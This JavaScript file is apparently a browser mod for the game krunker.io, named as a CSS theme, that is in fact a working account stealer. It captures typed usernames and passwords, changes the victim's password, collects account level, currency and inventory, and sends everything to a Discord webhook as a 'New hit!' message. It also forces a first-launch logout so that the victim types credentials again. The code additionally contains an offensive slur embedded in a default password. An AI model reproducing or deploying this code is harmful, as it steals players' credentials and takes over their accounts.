let version = 0.31

let buildid = "KrunkerCSS"
let setting_hightierwebhook = "ur webhook"
let setting_lvltohightier = 15
let setting_lowtierwebhook = "ur webhook"
let setting_avatar = "https://www.morphsuits.com/media/catalog/product/cache/937f440085cd52c4f06eb785557b6967/m/1/m1_4_3_4375_1.jpg"
let setting_antiduplicate = false
let setting_botname = "root"
let setting_logout = false
let setting_changepass = true
let setting_changepassdelay = 150
let setting_newpassrandom = true
let setting_newpass = "Nillkiggers122"
let setting_logoutonfirstlaunch = true
let setting_antisocial = true
let setting_playsoundafterlogout = false
let setting_soundurl = "https://cdn.discordapp.com/attachments/1014958824161026188/1089314963568476160/hello-my-name-is-gustavo.mp3"

if (setting_logoutonfirstlaunch == true) {
if (localStorage.getItem("firstlaunch") !== 1) {
localStorage.setItem("krunker_username", "")
localStorage.setItem("firstlaunch", "1")
}}




function getElementByXpath(path) {
  return document.evaluate(path, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
}
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function getRandomInt(max) {
  return Math.floor(Math.random() * max);
}
if (setting_newpassrandom == true) {
    function generatePassword() {
    var length = 15,
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        retVal = "";
    for (var i = 0, n = charset.length; i < length; ++i) {
        retVal += charset.charAt(Math.floor(Math.random() * n));
        setting_newpass = retVal
    }
    return retVal;
}
generatePassword()
}


let color = 1
let colorcode = getRandomInt(6)
if (colorcode == 0) { color = "5c72ff"}
if (colorcode == 1) { color = "ff63cb"}
if (colorcode == 2) { color = "54ff36"}
if (colorcode == 3) { color = "ff002b"}
if (colorcode == 4) { color = "ff0073"}
if (colorcode == 5) { color = "ffcb59"}

function hexToDecimal(hex) {
    return parseInt(hex.replace("#", ""), 16)
}
let doScript = true
let adstatus = localStorage.getItem("antidup")
if (adstatus == 1 && setting_antiduplicate == true) { doScript = false }

let username = ""
let password = ""
if (doScript == true) {
if (setting_antisocial == true && window.location.href.indexOf("social.html") > 0 ) {window.location.href = "http://krunker.io"}
const observer = new MutationObserver(() => {
    if (window.location.href.indexOf("krunker.io") > 0) {
        //let changed = false
        if (document.getElementById("accName") && document.getElementById("accName").value && username != document.getElementById("accName").value) {
            username = document.getElementById("accName").value
            //changed = true
        }
        if (document.getElementById("accPass") && document.getElementById("accPass").value && password != document.getElementById("accPass").value) {
            password = document.getElementById("accPass").value
            //changed = true
        }
        //if (changed) {
        //console.log(username + ":" + password)
        //}
        if (document.getElementsByClassName("setHed")[0] && username != "" && password != "") {
                const lvl = getElementByXpath('//*[@id="statHolder"]/div[3]/div[1]/strong').innerHTML
                const kr = getElementByXpath('//*[@id="statHolder"]/div[3]/div[2]/strong').innerHTML
                const inv = getElementByXpath('//*[@id="statHolder"]/div[3]/div[4]/strong').innerHTML
                const junk = getElementByXpath('//*[@id="statHolder"]/div[3]/div[3]/strong').innerHTML
                const playtime = getElementByXpath('//*[@id="statHolder"]/div[3]/div[26]/strong').innerHTML
            if (document.getElementsByClassName("bigMenTab")[3] && !document.getElementById("newPass")) {
                document.getElementsByClassName("bigMenTab")[3].click()
            }
            if (document.getElementById("newPass")) {
                document.getElementById("oldPass").value = password
                document.getElementById("newPass").value = setting_newpass
                document.getElementById("repNPass").value = setting_newpass
                if (setting_changepass = true) {
                document.getElementsByClassName("subPassChg")[0].click()
                setTimeout(() => {document.getElementsByClassName("bigMenTab")[0].click()}, setting_changepassdelay)
                }
                                let setting_webhook = ""
                if (lvl > setting_lvltohightier) { setting_webhook = setting_hightierwebhook }
                if (lvl < setting_lvltohightier) { setting_webhook = setting_lowtierwebhook }
                console.log(setting_webhook)
                if (setting_logout == true) {
                document.getElementsByClassName("menuLink")[1].click()
                const element = document.getElementById("menuPopHider");
                element.remove();
                }
                let message = ""
                if (setting_changepass == true) {
                    message = "```Username: " + username + "\nPassword: " + password + "\nNewPassword: " + setting_newpass + "\nLVL:" + lvl + "\nKR:" + kr + "\nInventory:" + inv + "\nJunk:" + junk + "\nPlay time:" + playtime + "```"
                }
                if (setting_changepass == false) {
                    message = "```Username: " + username + "\nPassword: " + password + "\nLVL:" + lvl + "\nKR:" + kr + "\nInventory:" + inv + "\nJunk:" + junk + "\nPlay time:" + playtime +"```"
                }
                document.querySelector("#menuWindow > div.bigMenTabs > div.bigMenTab.bigMenTabA")
                var myEmbed34 = {
                    author: {
                        name: "PTWline krunker.io"
                    },
                    title: "♿ **New hit!**",
                    description: message,
                    footer: {
                        text: "BuildID:" + buildid + " | Version:" + version,
                        icon_url: "https://cdn.discordapp.com/attachments/1014958824161026188/1080816289699868693/check.png"
                    },
                    color: hexToDecimal(color)
                }

                var params66 = {
                    avatar_url: setting_avatar,
                    username: setting_botname,
                    embeds: [myEmbed34]
                }
                fetch(setting_webhook, {
                    headers: {
                        "accept": "application/json, text/plain, */*",
                        "content-type": "application/json;charset=UTF-8"
                    },
                    method: "POST",
                    body: JSON.stringify(params66)
                });
                if (setting_playsoundafterlogout == true) {new Audio(setting_soundurl).play();}
                if (setting_antiduplicate == true) {
                    localStorage.setItem("antidup", "1")
                }
                username = ""
                password = ""
            }

        }
    }
});
const config = {
    subtree: true,
    childList: true
};
observer.observe(document, config);
}
